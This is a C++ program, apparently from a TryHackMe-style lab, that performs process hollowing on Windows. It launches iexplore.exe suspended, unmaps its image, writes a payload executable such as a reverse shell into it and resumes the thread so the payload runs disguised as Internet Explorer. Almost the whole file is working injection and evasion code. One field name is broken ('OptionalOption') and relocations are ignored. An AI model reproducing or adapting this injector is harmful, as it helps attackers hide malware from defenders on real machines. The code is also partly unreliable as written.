#include <stdio.h>
#include <Windows.h>

#pragma comment(lib, "ntdll.lib")  // Links the secret ntdll library so we can use undocumented functions

// This is an undocumented Windows NT function — not in standard Win32 API
// It completely unmaps (removes) an executable image from a process's memory
EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress);

int main() {

    // Allocate memory for process startup info and process information structures
    LPSTARTUPINFOA pVictimStartupInfo = new STARTUPINFOA();
    LPPROCESS_INFORMATION pVictimProcessInfo = new PROCESS_INFORMATION();

    // Zero them out — important! Avoids garbage data
    ZeroMemory(pVictimStartupInfo, sizeof(STARTUPINFOA));
    ZeroMemory(pVictimProcessInfo, sizeof(PROCESS_INFORMATION));

    // ------------------------------------------------------------------
    // 1. Choose what legitimate program we want to "hollow" (replace)
    // ------------------------------------------------------------------
    // We're using 32-bit Internet Explorer as the victim (common target in labs)
    LPCSTR victimImage = "C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe";

    // This is YOUR malicious executable — must also be 32-bit!
    // Change this path to your own payload (e.g., calc.exe, reverse shell, etc.)
    LPCSTR replacementImage = "C:\\Users\\THM-Attacker\\Desktop\\Injectors\\evil.exe";

    // ------------------------------------------------------------------
    // 2. Create the legitimate process — but SUSPENDED (frozen before it runs)
    // ------------------------------------------------------------------
    if (!CreateProcessA(
            0,                              // No module name (use command line)
            (LPSTR)victimImage,             // Full path to iexplore.exe
            0, 0,                           // No security attributes
            0,                              // Don't inherit handles
            CREATE_SUSPENDED,               // CRITICAL: Start frozen so we can modify it
            0, 0,                           // Normal environment and current directory
            pVictimStartupInfo,
            pVictimProcessInfo)) {
        printf("[-] Failed to create victim process %i\r\n", GetLastError());
        return 1;
    };

    printf("[+] Created victim process (iexplore.exe)\r\n");
    printf("\t[*] PID %i\r\n", pVictimProcessInfo->dwProcessId);

    
    // ------------------------------------------------------------------
    // 3. Open and read your malicious executable (evil.exe) into memory
    // ------------------------------------------------------------------
    HANDLE hReplacement = CreateFileA(
        replacementImage,
        GENERIC_READ,
        FILE_SHARE_READ,
        0,
        OPEN_EXISTING,
        0,
        0
    );

    if (hReplacement == INVALID_HANDLE_VALUE) {
        printf("[-] Unable to open replacement executable %i\r\n", GetLastError());
        TerminateProcess(pVictimProcessInfo->hProcess, 1);
        return 1;
    }

    DWORD replacementSize = GetFileSize(hReplacement, 0);
    printf("[+] Replacement executable opened\r\n");
    printf("\t[*] Size %i bytes\r\n", replacementSize);

    
    // Allocate memory in OUR process to hold the entire evil.exe file
    PVOID pReplacementImage = VirtualAlloc(
        0, 
        replacementSize, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_READWRITE);

    DWORD totalNumberofBytesRead;

    // Read the entire evil.exe from disk into our memory buffer
    if (!ReadFile(
            hReplacement, 
            pReplacementImage, 
            replacementSize, 
            &totalNumberofBytesRead, 
            0)) {
        printf("[-] Unable to read the replacement executable into an image in memory %i\r\n", GetLastError());
        TerminateProcess(pVictimProcessInfo->hProcess, 1);
        return 1;
    }
    CloseHandle(hReplacement);
    printf("[+] Read replacement executable into memory\r\n");
    printf("\t[*] In current process at 0x%08x\r\n", (UINT)pReplacementImage);

    
    // ------------------------------------------------------------------
    // 4. Get the thread context — in 32-bit processes:
    //     → EBX points to the PEB (Process Environment Block)
    //     → EAX contains the original entry point
    // ------------------------------------------------------------------
    CONTEXT victimContext;
    victimContext.ContextFlags = CONTEXT_FULL;  // We want all registers
    GetThreadContext(pVictimProcessInfo->hThread, &victimContext);
    printf("[+] Obtained context from victim process's primary thread\r\n");
    printf("\t[*] Victim PEB address / EBX = 0x%08x\r\n", (UINT)victimContext.Ebx);
    printf("\t[*] Victim entry point / EAX = 0x%08x\r\n", (UINT)victimContext.Eax);

    
    // ------------------------------------------------------------------
    // 5. Read the real base address of iexplore.exe from the PEB
    //     In 32-bit PEB: ImageBaseAddress is at offset +0x8 from PEB
    // ------------------------------------------------------------------
    PVOID pVictimImageBaseAddress;
    ReadProcessMemory(
        pVictimProcessInfo->hProcess, 
        (PVOID)(victimContext.Ebx + 8),  // PEB + 0x8 = Image Base Address (32-bit only!)
        &pVictimImageBaseAddress, 
        sizeof(PVOID), 
        0);
    printf("[+] Extracted image base address of victim process\r\n");
    printf("\t[*] Address: 0x%08x\r\n", (UINT)pVictimImageBaseAddress);

    
    // ------------------------------------------------------------------
    // 6. THE HOLLOWING — Remove the original iexplore.exe from memory!
    // ------------------------------------------------------------------
    DWORD dwResult = NtUnmapViewOfSection(
        pVictimProcessInfo->hProcess,
        pVictimImageBaseAddress);
    if (dwResult) {
        printf("[-] Error unmapping section in victim process\r\n");
        TerminateProcess(pVictimProcessInfo->hProcess, 1);
        return 1;
    }

    printf("[+] Hollowed out victim executable via NtUnmapViewOfOfSection\r\n");
    printf("\t[*] Utilized base address of 0x%08x\r\n", (UINT)pVictimImageBaseAddress);

    
    // ------------------------------------------------------------------
    // 7. Parse PE headers of evil.exe to get important info
    // ------------------------------------------------------------------
    PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pReplacementImage;
    PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pReplacementImage + pDOSHeader->e_lfanew);
    
    // Preferred base address and total size needed in memory
    DWORD replacementImageBaseAddress = pNTHeaders->OptionalHeader.ImageBase;
    DWORD sizeOfReplacementImage = pNTHeaders->OptionalOption.SizeOfImage;

    printf("[+] Replacement image metadata extracted\r\n");
    printf("\t[*] Preferred base address = 0x%08x\r\n", replacementImageBaseAddress);
    printf("\t[*] Entry point RVA = 0x%08x\r\n", pNTHeaders->OptionalHeader.AddressOfEntryPoint);
    printf("\t[*] Total image size = %i bytes\r\n", sizeOfReplacementImage);
    
    // ------------------------------------------------------------------
    // 8. Allocate memory inside the victim process at the original address
    //     (This avoids relocation — makes it cleaner)
    // ------------------------------------------------------------------
    PVOID pVictimHollowedAllocation = VirtualAllocEx(
        pVictimProcessInfo->hProcess,
        (PVOID)pVictimImageBaseAddress,     // Try to allocate at same address
        sizeOfReplacementImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);            // Full access for now
    if (!pVictimHollowedAllocation) {
        printf("[-] Unable to allocate memory in victim process %i\r\n", GetLastError());
        TerminateProcess(pVictimProcessInfo->hProcess, 1);
        return 1;
    }
    printf("[+] Allocated memory in victim process\r\n");
    printf("\t[*] New image will live at: 0x%08x\r\n", (UINT)pVictimHollowedAllocation);
    
    
    // ------------------------------------------------------------------
    // 9. Write PE headers first (DOS header, NT headers, section table)
    // ------------------------------------------------------------------
    WriteProcessMemory(
        pVictimProcessInfo->hProcess, 
        pVictimHollowedAllocation,          // Usually same as pVictimImageBaseAddress
        pReplacementImage,
        pNTHeaders->OptionalHeader.SizeOfHeaders,
        0);
    printf("\t[*] Headers written into victim process\r\n");
    
    // ------------------------------------------------------------------
    // 10. Write each section (.text, .data, .rsrc, etc.) to correct location
    // ------------------------------------------------------------------
    for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pSectionHeader = 
            (PIMAGE_SECTION_HEADER)((LPBYTE)pReplacementImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) 
                + (i * sizeof(IMAGE_SECTION_HEADER)));
                
        WriteProcessMemory(pVictimProcessInfo->hProcess, 
            (PVOID)((LPBYTE)pVictimHollowedAllocation + pSectionHeader->VirtualAddress),  // Destination VA
            (PVOID)((LPBYTE)pReplacementImage + pSectionHeader->PointerToRawData),        // Source data
            pSectionHeader->SizeOfRawData, 
            0);
        printf("\t[*] Section %.8s written → 0x%08x\r\n", 
               pSectionHeader->Name, 
               (UINT)pVictimHollowedAllocation + pSectionHeader->VirtualAddress);
    }
    
    
    // ------------------------------------------------------------------
    // 11. Change the thread's entry point (EAX) to point to evil.exe's entry point
    // ------------------------------------------------------------------
    victimContext.Eax = (DWORD)((LPBYTE)pVictimHollowedAllocation + pNTHeaders->OptionalHeader.AddressOfEntryPoint);
    SetThreadContext(pVictimProcessInfo->hThread, &victimContext);
    printf("[+] Victim process entry point set to replacement image entry point in EAX register\n");
    printf("\t[*] New EAX = 0x%08x\r\n", (UINT)victimContext.Eax);

    
    // ------------------------------------------------------------------
    // 12. RESUME THE THREAD → evil.exe now runs disguised as iexplore.exe!
    // ------------------------------------------------------------------
    printf("[+] Resuming victim process primary thread...\n");
    ResumeThread(pVictimProcessInfo->hThread);

    // ------------------------------------------------------------------
    // 13. Cleanup
    // ------------------------------------------------------------------
    printf("[+] Cleaning up handles and memory...\n");
    CloseHandle(pVictimProcessInfo->hThread);
    CloseHandle(pVictimProcessInfo->hProcess);
    VirtualFree(pReplacementImage, 0, MEM_RELEASE);

    printf("[+] Process hollowing complete! Your payload is running as iexplore.exe\n");

    return 0;
}